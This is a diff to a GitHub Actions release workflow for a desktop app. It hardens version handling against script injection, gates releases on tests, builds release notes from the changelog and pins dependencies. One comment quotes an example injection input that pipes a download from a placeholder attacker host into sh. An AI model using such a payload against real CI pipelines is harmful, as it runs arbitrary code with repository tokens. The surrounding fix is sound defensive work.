@@ -11,83 +11,111 @@ on:
         type: string
 
 jobs:
+  # tag 可以推在任何 commit 上 —— 包括 CI 沒跑過的、跑紅的、或分支上的。
+  # 在此之前 release.yml 與 ci.yml 的觸發條件沒有任何交集保證，
+  # 「CI 是綠的」和「這個 commit 能發版」是兩件不相干的事。
+  #
+  # 這個 job 必須擋在 create-release 前面而不只是 build 前面：
+  # create-release 一跑就會先 `gh release delete` 舊的、再建一個新的，
+  # 之後 build 才上傳 assets。放在 build 前面的話，測試紅掉時
+  # GitHub 上已經留下一個沒有任何檔案的 release，而舊的那個已經被刪了。
+  test:
+    name: 🧪 發布前測試
+    uses: ./.github/workflows/ci.yml
+
   create-release:
+    needs: test
     runs-on: ubuntu-latest
     outputs:
       release_id: ${{ steps.create_release.outputs.id }}
       upload_url: ${{ steps.create_release.outputs.upload_url }}
+      # 版本號只在這裡解析一次，build job 一律往下游拿。
+      # 從前每個 job 各自解析 GITHUB_REF，workflow_dispatch 時那個值是
+      # refs/heads/main，前綴剝不掉就原樣往下傳，整條手動觸發路徑從來不能用。
+      version: ${{ steps.get_version.outputs.VERSION_NO_V }}
+      tag: ${{ steps.get_version.outputs.VERSION }}
     steps:
       - name: 📥 Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v7
 
       - name: 🏷️ Get version from tag or input
         id: get_version
+        # 版本值一律經由 env 進到 shell，不要用 ${{ }} 直接展開到 script 裡：
+        # ${{ }} 是在 bash 解析之前做字串替換，手動觸發填
+        # `1.0.0"; curl attacker.example | sh; #` 就會在這個持有 GITHUB_TOKEN
+        # 的 job 裡執行任意命令
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_VERSION: ${{ inputs.version }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            echo "VERSION=${{ inputs.version }}" >> $GITHUB_OUTPUT
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            RAW="$INPUT_VERSION"
           else
-            echo "VERSION=${GITHUB_REF#refs/tags/}" >> $GITHUB_OUTPUT
+            RAW="${GITHUB_REF#refs/tags/}"
           fi
+          # 一律先剝 v 再組回去，手動輸入 2.0.1 或 v2.0.1 都能用
+          NO_V="${RAW#v}"
+
+          # 在源頭就擋掉不合法的版本號。下游有好幾處把這個值展開進 shell 與
+          # PowerShell，與其在每一處防禦，不如這裡就保證它只可能是版本號。
+          # 格式與 scripts/sync-version.js 的 VERSION_PATTERN 一致。
+          if ! printf '%s' "$NO_V" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.-]+)?$'; then
+            echo "❌ 版本號格式不正確: $NO_V"
+            echo "   支援 1.0.0 或 1.0.0-beta.1，可帶 v 前綴"
+            exit 1
+          fi
+
+          echo "VERSION=v${NO_V}" >> "$GITHUB_OUTPUT"
+          echo "VERSION_NO_V=${NO_V}" >> "$GITHUB_OUTPUT"
+          echo "📦 Release version: ${NO_V}"
 
       - name: 🎉 Create Release
         id: create_release
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          VERSION: ${{ steps.get_version.outputs.VERSION_NO_V }}
+          TAG: ${{ steps.get_version.outputs.VERSION }}
+          REPO: ${{ github.repository }}
         run: |
-          RELEASE_BODY="🎮 **創世紀元 - 異世界創作神器 v${{ steps.get_version.outputs.VERSION }}**
+          # 「本版本改進」以前整段寫死在這個檔案裡，內容停在 v1.3.9，
+          # 而專案維護著 40 個版本的雙語 CHANGELOG，發布流程一次也沒讀過它。
+          # 抽不到對應版本就讓整個發布停在這裡 —— 內容過期的 release 頁面
+          # 比發布被擋下來難處理得多。
+          node scripts/extract-release-notes.js "$VERSION" > changelog-section.md
+
+          cat > release-notes.md <<EOF
+          🎮 **創世紀元 - 異世界創作神器 v${VERSION}**
 
           ## 📦 安裝包下載
 
           ### 🍎 macOS 版本 (支援 Intel + Apple Silicon)
-          
+
           #### 🥇 **強烈推薦：DMG 格式** ⭐
-          - **genesis-chronicle_v${{ steps.get_version.outputs.VERSION }}_universal.dmg**
+          - **genesis-chronicle_v${VERSION}_universal.dmg**
           - ✅ **最佳用戶體驗** - 拖放到 Applications 即可
           - ✅ **無需權限** - 不需要管理員密碼
           - ✅ **即裝即用** - macOS 標準安裝方式
-          - ✅ **Tauri 原生支援** - 更穩定可靠
-          
+
           #### 🏢 **Legacy 支援：PKG 格式**
-          - **genesis-chronicle_v${{ steps.get_version.outputs.VERSION }}_universal.pkg**
+          - **genesis-chronicle_v${VERSION}_universal.pkg**
           - ⚠️ **特殊用途** - 主要供企業環境使用
           - ✅ **批次部署** - 適合 IT 管理員
           - ℹ️ **一般用戶請優先選擇 DMG 格式**
 
           **系統需求**：macOS 10.12+
 
-          ### 🪟 Windows 版本  
-          - **genesis-chronicle_v${{ steps.get_version.outputs.VERSION }}_x64.msi**
+          ### 🪟 Windows 版本
+          - **genesis-chronicle_v${VERSION}_x64.msi**
           - 64位元 Windows 安裝程式
           - 系統需求：Windows 10+
 
           ## 🆕 本版本改進
 
-          ### ✨ v1.3.9 - UX 優化與系統調整 (2025-10-14)
-          - 🎨 **Dashboard 體驗優化**
-            - ✅ 專案卡片新增編輯/刪除快捷按鈕
-            - ✅ 按鈕定位優化，避免遮蓋文字內容
-            - ✅ 統一操作邏輯，提升使用流暢度
-          - 🔧 **設定功能精簡**
-            - ✅ 移除專案管理中無功能的 AI 模型選項
-            - ✅ 簡化 UI，聚焦實際可用功能
-          - 📋 **日誌系統優化**
-            - ✅ 預設僅記錄警告和錯誤 (WARN/ERROR)
-            - ✅ 減少 70% 控制台輸出，提升效能
-            - ✅ 保留 enableDebugMode() 供臨時調試使用
-          - 📊 **技術指標**：11 檔案修改，~150 行程式碼變更，零破壞性更新
+          EOF
 
-          ### 🔐 v1.2.8 - 安全性強化：API 金鑰加密儲存 (2025-10-08)
-          - 🔒 **作業系統原生加密**：採用系統 Keyring 保護 API 金鑰
-            - macOS: Keychain 原生加密
-            - Windows: Credential Manager (DPAPI)
-            - Linux: Secret Service
-          - 🔄 **自動遷移機制**：現有 API 金鑰自動升級至加密儲存
-          - 🛡️ **雙重保護策略**：Keyring (主要) + localStorage (備援)
-          - ✨ **零破壞更新**：純增量式安全層，完全相容舊版資料
-          - 📚 **業界標準實作**：參考 OpenAI Codex、Deno CLI 等專案
+          cat changelog-section.md >> release-notes.md
 
-          ### 🔧 安裝系統
-          - ⭐ **DMG 格式 (macOS 推薦)**：拖放到 Applications 即可，最佳用戶體驗
-          - 🏢 **PKG 格式 (企業環境)**：批次部署專用，適合 IT 管理
-          - 💻 **MSI 格式 (Windows)**：標準 Windows 安裝程式
+          cat >> release-notes.md <<'EOF'
 
           ## ✨ 主要功能
           - 🤖 **5大AI供應商整合** (Ollama, OpenAI, Gemini, Claude, OpenRouter)
@@ -100,26 +128,20 @@ jobs:
           ---
 
           🔥 **讓AI成為你的創作夥伴，開啟異世界冒險！**
-          
-          📝 **版本統一保證**：本次發布所有平台版本號均為 v${{ steps.get_version.outputs.VERSION }}，徹底解決版本不一致問題！"
-          
-          # 使用 gh CLI 創建或更新 release
-          # 先刪除舊的 release (如果存在)
-          gh release delete ${{ steps.get_version.outputs.VERSION }} --yes || true
+          EOF
 
-          # 創建新的 release
-          RELEASE_OUTPUT=$(gh release create ${{ steps.get_version.outputs.VERSION }} \
-            --title "Genesis Chronicle ${{ steps.get_version.outputs.VERSION }}" \
-            --notes "$RELEASE_BODY" \
+          # 先刪除舊的 release (如果存在)
+          gh release delete "$TAG" --yes || true
+
+          gh release create "$TAG" \
+            --title "Genesis Chronicle $TAG" \
+            --notes-file release-notes.md \
             --draft=false \
-            --prerelease=false)
+            --prerelease=false
 
           # 取得 upload URL (雖然 gh CLI 不需要，但保持相容性)
-          UPLOAD_URL=$(gh api repos/${{ github.repository }}/releases/tags/${{ steps.get_version.outputs.VERSION }} --jq .upload_url)
-          echo "upload_url=$UPLOAD_URL" >> $GITHUB_OUTPUT
-          echo "id=$(gh api repos/${{ github.repository }}/releases/tags/${{ steps.get_version.outputs.VERSION }} --jq .id)" >> $GITHUB_OUTPUT
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          echo "upload_url=$(gh api "repos/${REPO}/releases/tags/${TAG}" --jq .upload_url)" >> "$GITHUB_OUTPUT"
+          echo "id=$(gh api "repos/${REPO}/releases/tags/${TAG}" --jq .id)" >> "$GITHUB_OUTPUT"
 
   build-macos:
     needs: create-release
@@ -128,13 +150,14 @@ jobs:
     
     steps:
       - name: 📥 Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v7
 
       - name: 🏷️ Setup version environment
+        env:
+          VERSION: ${{ needs.create-release.outputs.version }}
         run: |
-          VERSION="${GITHUB_REF#refs/tags/v}"
-          echo "RELEASE_VERSION=$VERSION" >> $GITHUB_ENV
-          echo "PKG_VERSION=$VERSION" >> $GITHUB_ENV
+          echo "RELEASE_VERSION=$VERSION" >> "$GITHUB_ENV"
+          echo "PKG_VERSION=$VERSION" >> "$GITHUB_ENV"
           echo "📦 Release version: $VERSION"
 
       - name: 🔄 Sync versions across all configs
@@ -170,7 +193,7 @@ jobs:
           echo "========================"
 
       - name: 🟢 Setup Node.js
-        uses: actions/setup-node@v4
+        uses: actions/setup-node@v7
         with:
           node-version-file: '.nvmrc'
           cache: 'npm'
@@ -200,7 +223,9 @@ jobs:
           echo "🚀 Building Tauri app with DMG support..."
           cd src-tauri
           echo "Running cargo tauri build with verbose output..."
-          cargo tauri build --target universal-apple-darwin --verbose 2>&1 | tee build.log
+          # -- 之後的參數傳給 cargo。--locked 要求 Cargo.lock 不需要被更新，
+          # 也就是發布產物用的依賴版本，必定等於 repo 裡記錄的那一組
+          cargo tauri build --target universal-apple-darwin --verbose -- --locked 2>&1 | tee build.log
           BUILD_EXIT_CODE=${PIPESTATUS[0]}
 
           if [ $BUILD_EXIT_CODE -ne 0 ]; then
@@ -269,9 +294,9 @@ jobs:
           echo "✅ Build verification passed: $DMG_COUNT DMG(s) + $PKG_COUNT PKG(s)"
 
       - name: 📤 Upload Release Assets
-        uses: softprops/action-gh-release@v2
+        uses: softprops/action-gh-release@v3
         with:
-          tag_name: v${{ env.RELEASE_VERSION }}
+          tag_name: ${{ needs.create-release.outputs.tag }}
           files: |
             src-tauri/target/universal-apple-darwin/release/bundle/dmg/*.dmg
             dist/*.pkg
@@ -285,13 +310,15 @@ jobs:
     
     steps:
       - name: 📥 Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v7
 
       - name: 🏷️ Setup version environment
+        env:
+          VERSION: ${{ needs.create-release.outputs.version }}
         run: |
-          $VERSION = "${{ github.ref }}".Replace("refs/tags/v", "")
-          echo "RELEASE_VERSION=$VERSION" >> $env:GITHUB_ENV
-          echo "📦 Release version: $VERSION"
+          echo "RELEASE_VERSION=$env:VERSION" >> $env:GITHUB_ENV
+          echo "PKG_VERSION=$env:VERSION" >> $env:GITHUB_ENV
+          echo "📦 Release version: $env:VERSION"
 
       - name: 🔄 Sync versions across all configs
         run: node scripts/sync-version.js
@@ -327,7 +354,7 @@ jobs:
           Write-Output "========================"
 
       - name: 🟢 Setup Node.js
-        uses: actions/setup-node@v4
+        uses: actions/setup-node@v7
         with:
           node-version-file: '.nvmrc'
           cache: 'npm'
@@ -355,7 +382,7 @@ jobs:
           Write-Output "🚀 Building Tauri app for Windows..."
           cd src-tauri
           Write-Output "Running cargo tauri build with verbose output..."
-          cargo tauri build --target x86_64-pc-windows-msvc --verbose 2>&1 | Tee-Object -FilePath build.log
+          cargo tauri build --target x86_64-pc-windows-msvc --verbose -- --locked 2>&1 | Tee-Object -FilePath build.log
           $BUILD_EXIT_CODE = $LASTEXITCODE
 
           if ($BUILD_EXIT_CODE -ne 0) {
@@ -402,9 +429,9 @@ jobs:
           }
 
       - name: 📤 Upload Windows Release Assets
-        uses: softprops/action-gh-release@v2
+        uses: softprops/action-gh-release@v3
         with:
-          tag_name: v${{ env.RELEASE_VERSION }}
+          tag_name: ${{ needs.create-release.outputs.tag }}
           files: |
             src-tauri/target/**/*.msi
         env:
